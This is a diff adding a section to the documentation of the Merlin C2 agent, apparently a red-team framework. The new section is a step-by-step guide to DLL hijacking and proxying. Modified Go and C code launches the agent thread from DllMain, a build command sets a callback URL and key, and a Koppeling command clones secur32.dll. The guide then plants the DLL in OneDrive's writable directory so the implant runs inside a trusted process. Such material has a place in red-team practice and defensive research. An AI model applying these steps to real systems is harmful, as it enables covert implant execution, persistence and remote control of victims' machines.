@@ -61,3 +61,90 @@ A different Merlin server *can* be provided when executing the DLL by supplying 
 ``rundll32 merlin.dll,Run https://yourdomian.com:443/``
 
 **NOTE:** Passing a custom URL only works when using cmd.exe and fails when using powershell.exe
+
+DLL Hijacking/Proxying with the Merlin DLL Agent
+------------------------------------------------
+
+With a little bit of setup, the Merlin DLL agent can be used for DLL Hijacking / Side-loading / Proxying. This is a great technique to get the Merlin agent running in the codespace of a trusted process.
+
+The specifics on choosing an executable for DLL proxying are outside the scope of this documentation. Assume that a candidate executable has been identified.
+
+In the ``merlin-agent-dll`` repo, add a new exported function with an arbitrary name to ``main.go``. Have this function execute the ``run`` function with the ``url`` argument:
+
+.. code-block:: go
+    
+    ...[SNIP]...
+    
+    // EXPORTED FUNCTIONS
+
+    // MagicMan is a test function
+    //
+    //export MagicMan
+    func MagicMan() {
+        run(url)
+    }
+
+    ...[SNIP]...
+
+Note that the name of the exported function must match in the comment block and the code itself or Go will complain during compilation.
+
+Now, in the ``merlin.c`` source code, add a new function that executes the exported function from ``main.go``:
+
+.. code-block:: c
+    
+    ...[SNIP]...
+    
+    DWORD WINAPI RunMagicMan(LPVOID LpParam){
+        //MessageBoxA( NULL, "Hello from MagicMan() in Merlin", "DLL Load", MB_OK );
+        MagicMan();
+        return TRUE;
+    }
+
+    ...[SNIP]...
+
+Next, edit the structure of ``DllMain`` entry point. We want to create a thread that will execute the Merlin agent function when the DLL is side-loaded into the process:
+
+.. code-block:: c
+    
+    ...[SNIP]...
+    
+    BOOL WINAPI DllMain(
+        HINSTANCE hinstDLL,  // handle to DLL module
+        DWORD fdwReason,     // reason for calling function
+        LPVOID lpReserved )  // reserved
+    {
+        // Perform actions based on the reason for calling.
+        switch( fdwReason )
+        {
+            case DLL_PROCESS_ATTACH:
+                //MessageBoxA( NULL, "Hello from DllMain-PROCESS_ATTACH in Merlin!", "DLL Load", MB_OK );
+                CreateThread(NULL, 0, RunMagicMan, NULL, 0, 0);
+                break;
+
+    ...[SNIP]...
+    
+Now, when the Merlin DLL Agent is loaded by a trusted process, the DLL entry point will run the CreateThread function and execute the agent.
+
+Build the DLL agent with the merlin-agent-dll makefile and supply your desired URL, PSK, and protocol parameters:
+
+``husky@dev-kde:~/merlin-agent-dll$ make URL=http://10.10.1.237:8443 PSK=merlin PROTO=http``
+
+Let's assume that we're targeting the OneDrive.exe program for our DLL Proxy. We know that OneDrive.exe loads ``secur32.dll`` from the present working directory during execution.
+
+We can now use a tool like Koppelling to create a proxied DLL:
+
+``PS C:\Users\Matt\Desktop\Koppeling> .\NetClone.exe --target 'C:\Users\Matt\Desktop\merlin.dll' --reference 'C:\Windows\system32\secur32.dll' --output 'C:\Users\Matt\Desktop\secur32.dll'``
+
+Then, we endeavor to drop our proxied DLL into the OneDrive application directory. Luckily for us, this is in %APPDATA% and we can write to the directory: 
+
+``C:\Users\Matt\AppData\Local\Microsoft\OneDrive``
+
+When the application starts, our proxied DLL is pulled into the process and a thread is executed. Our session is established and our agent lives inside the OneDrive.exe process:
+
+.. image:: ../images/dll-proxy-1.png
+   :align: center
+   :alt: DLL Proxy 1
+   
+.. image:: ../images/dll-proxy-2.png
+   :align: center
+   :alt: DLL Proxy 2
